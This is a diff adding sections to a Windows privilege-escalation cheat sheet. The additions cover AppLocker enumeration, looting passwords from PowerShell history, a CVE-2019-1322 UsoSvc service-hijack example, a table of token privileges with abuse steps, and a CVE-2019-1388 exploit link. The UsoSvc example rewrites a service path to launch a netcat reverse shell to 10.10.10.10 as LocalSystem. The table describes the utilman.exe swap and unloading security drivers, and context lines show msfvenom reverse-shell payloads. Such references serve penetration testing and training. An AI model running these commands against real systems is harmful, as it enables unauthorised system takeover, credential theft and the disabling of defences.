@@ -6,7 +6,16 @@
 * [Windows Version and Configuration](#windows-version-and-configuration)
 * [User Enumeration](#user-enumeration)
 * [Network Enumeration](#network-enumeration)
+* [AppLocker Enumeration](#applocker-enumeration)
 * [EoP - Looting for passwords](#eop---looting-for-passwords)
+    * [SAM and SYSTEM files](#sam-and-system-files)
+    * [Search for file contents](#search-for-file-contents)
+    * [Search for a file with a certain filename](#search-for-a-file-with-a-certain-filename)
+    * [Search the registry for key names and passwords](#search-the-registry-for-key-names-and-passwords)
+    * [Passwords in unattend.xml](#passwords-in-unattend.xml)
+    * [Wifi passwords](#wifi-passwords)
+    * [Passwords stored in services](#passwords-stored-in-services)
+    * [Powershell history](#powershell-history)
 * [EoP - Processes Enumeration and Tasks](#eop---processes-enumeration-and-tasks)
 * [EoP - Incorrect permissions in services](#eop---incorrect-permissions-in-services)
 * [EoP - Windows Subsystem for Linux (WSL)](#eop---windows-subsystem-for-linux-wsl)
@@ -28,6 +37,7 @@
   * [MS15-051 (Client Copy Image)](#ms15-051---microsoft-windows-2003--2008--7--8--2012)
   * [MS16-032](#ms16-032---microsoft-windows-7--10--2008--2012-r2-x86x64)
   * [MS17-010 (Eternal Blue)](#ms17-010-eternal-blue)
+  * [CVE-2019-1388](#cve-2019-1388)
 * [References](#references)
 
 ## Tools
@@ -209,6 +219,11 @@ reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s
 Get-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse
 ```
 
+## AppLocker Enumeration
+
+- With the GPO
+- HKLM\SOFTWARE\Policies\Microsoft\Windows\SrpV2 (Keys: Appx, Dll, Exe, Msi and Script).
+
 ## EoP - Looting for passwords
 
 ### SAM and SYSTEM files
@@ -381,6 +396,14 @@ Invoke-SessionGopher -AllDomain -o
 Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
 ```
 
+### Powershell history
+
+```powershell
+type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+cat (Get-PSReadlineOption).HistorySavePath
+cat (Get-PSReadlineOption).HistorySavePath | sls passw
+```
 
 ## EoP - Processes Enumeration and Tasks
 
@@ -468,7 +491,33 @@ Note to check file permissions you can use `cacls` and `icacls`
 
 You are looking for `BUILTIN\Users:(F)`(Full access), `BUILTIN\Users:(M)`(Modify access) or  `BUILTIN\Users:(W)`(Write-only access) in the output.
 
-### Example with Windows XP SP1
+### Example with Windows 10 - CVE-2019-1322 UsoSvc
+
+Prerequisite: Service account
+
+```powershell
+PS C:\Windows\system32> sc.exe stop UsoSvc
+PS C:\Windows\system32> sc.exe config UsoSvc binPath="cmd /c type C:\Users\Administrator\Desktop\root.txt > C:\a.txt"
+PS C:\Windows\system32> sc.exe config usosvc binPath="C:\Windows\System32\spool\drivers\color\nc.exe 10.10.10.10 4444 -e cmd.exe"
+PS C:\Windows\system32> sc.exe config UsoSvc binpath= "C:\Users\mssql-svc\Desktop\nc.exe 10.10.10.10 4444 -e cmd.exe"
+PS C:\Windows\system32> sc.exe qc usosvc
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: usosvc
+        TYPE               : 20  WIN32_SHARE_PROCESS 
+        START_TYPE         : 2   AUTO_START  (DELAYED)
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:\Users\mssql-svc\Desktop\nc.exe 10.10.10.10 4444 -e cmd.exe
+        LOAD_ORDER_GROUP   : 
+        TAG                : 0
+        DISPLAY_NAME       : Update Orchestrator Service
+        DEPENDENCIES       : rpcss
+        SERVICE_START_NAME : LocalSystem
+
+PS C:\Windows\system32> sc.exe start UsoSvc
+```
+
+### Example with Windows XP SP1 - upnphost
 
 ```powershell
 # NOTE: spaces are mandatory for this exploit to work !
@@ -542,6 +591,8 @@ The Microsoft Windows Unquoted Service Path Enumeration Vulnerability. All Windo
 
 ```powershell
 wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """
+
+wmic service get name,displayname,startmode,pathname | findstr /i /v "C:\Windows\\" |findstr /i /v """
 
 gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
 ```
@@ -665,6 +716,20 @@ Microsoft.Workflow.Compiler.exe tests.xml results.xml
 
 ## EoP - Impersonation Privileges
 
+Full privileges cheatsheet at https://github.com/gtworek/Priv2Admin, summary below will only list direct ways to exploit the privilege to obtain an admin session or read sensitive files.
+
+| Privilege | Impact | Tool | Execution path | Remarks |
+| --- | --- | --- | --- | --- |
+|`SeAssignPrimaryToken`| ***Admin*** | 3rd party tool | *"It would allow a user to impersonate tokens and privesc to nt system using tools such as potato.exe, rottenpotato.exe and juicypotato.exe"* | Thank you [Aurélien Chalot](https://twitter.com/Defte_) for the update. I will try to re-phrase it to something more recipe-like soon. |
+|`SeBackup`| **Threat** | ***Built-in commands*** | Read sensitve files with `robocopy /b` |- May be more interesting if you can read %WINDIR%\MEMORY.DMP<br> <br>- `SeBackupPrivilege` (and robocopy) is not helpful when it comes to open files.<br> <br>- Robocopy requires both SeBackup and SeRestore to work with /b parameter. |
+|`SeCreateToken`| ***Admin*** | 3rd party tool | Create arbitrary token including local admin rights with `NtCreateToken`. ||
+|`SeDebug`| ***Admin*** | **PowerShell** | Duplicate the `lsass.exe` token.  | Script to be found at [FuzzySecurity](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1) |
+|`SeLoadDriver`| ***Admin*** | 3rd party tool | 1. Load buggy kernel driver such as `szkg64.sys`<br>2. Exploit the driver vulnerability<br> <br> Alternatively, the privilege may be used to unload security-related drivers with `ftlMC` builtin command. i.e.: `fltMC sysmondrv` | 1. The `szkg64` vulnerability is listed as [CVE-2018-15732](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15732)<br>2. The `szkg64` [exploit code](https://www.greyhathacker.net/?p=1025) was created by [Parvez Anwar](https://twitter.com/parvezghh)  |
+|`SeRestore`| ***Admin*** | **PowerShell** | 1. Launch PowerShell/ISE with the SeRestore privilege present.<br>2. Enable the privilege with [Enable-SeRestorePrivilege](https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1)).<br>3. Rename utilman.exe to utilman.old<br>4. Rename cmd.exe to utilman.exe<br>5. Lock the console and press Win+U| Attack may be detected by some AV software.<br> <br>Alternative method relies on replacing service binaries stored in "Program Files" using the same privilege. |
+|`SeTakeOwnership`| ***Admin*** | ***Built-in commands*** |1. `takeown.exe /f "%windir%\system32"`<br>2. `icalcs.exe "%windir%\system32" /grant "%username%":F`<br>3. Rename cmd.exe to utilman.exe<br>4. Lock the console and press Win+U| Attack may be detected by some AV software.<br> <br>Alternative method relies on replacing service binaries stored in "Program Files" using the same privilege. |
+|`SeTcb`| ***Admin*** | 3rd party tool | Manipulate tokens to have local admin rights included. May require SeImpersonate.<br> <br>To be verified. ||
+
+
 ### Meterpreter getsystem and alternatives
 
 ```powershell
@@ -700,7 +765,7 @@ Get-Process wininit | Invoke-TokenManipulation -CreateProcess "Powershell.exe -n
 ### Juicy Potato (abusing the golden privileges)
 
 Binary available at : https://github.com/ohpe/juicy-potato/releases    
-:warning: Juicy Potato doesn't work in Windows Server 2019. 
+:warning: Juicy Potato doesn't work on Windows Server 2019 and Windows 10 1809. 
 
 1. Check the privileges of the service account, you should look for **SeImpersonate** and/or **SeAssignPrimaryToken** (Impersonate a client after authentication)
 
@@ -840,6 +905,20 @@ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 EXITFUNC=threa
 python2 send_and_execute.py 10.0.0.1 revshell.exe
 ```
 
+### CVE-2019-1388
+
+Exploit : https://packetstormsecurity.com/files/14437/hhupd.exe.html
+
+Working on :
+- Windows 7 
+- Windows 10 LTSC 10240
+
+Failing on : 
+- LTSC 2019
+- 1709
+- 1803
+
+Detailed information about the vulnerability : https://www.zerodayinitiative.com/blog/2019/11/19/thanksgiving-treat-easy-as-pie-windows-7-secure-desktop-escalation-of-privilege
 
 ## References
 
@@ -870,3 +949,4 @@ python2 send_and_execute.py 10.0.0.1 revshell.exe
 * [Pentestlab.blog - WPE-13 - Intel SYSRET](https://pentestlab.blog/2017/06/14/intel-sysret/)
 * [Alternative methods of becoming SYSTEM - 20th November 2017 - Adam Chester @_xpn_](https://blog.xpnsec.com/becoming-system/)
 * [Living Off The Land Binaries and Scripts (and now also Libraries)](https://github.com/LOLBAS-Project/LOLBAS)
+* [Common Windows Misconfiguration: Services - 2018-09-23 - @am0nsec](https://amonsec.net/2018/09/23/Common-Windows-Misconfiguration-Services.html)
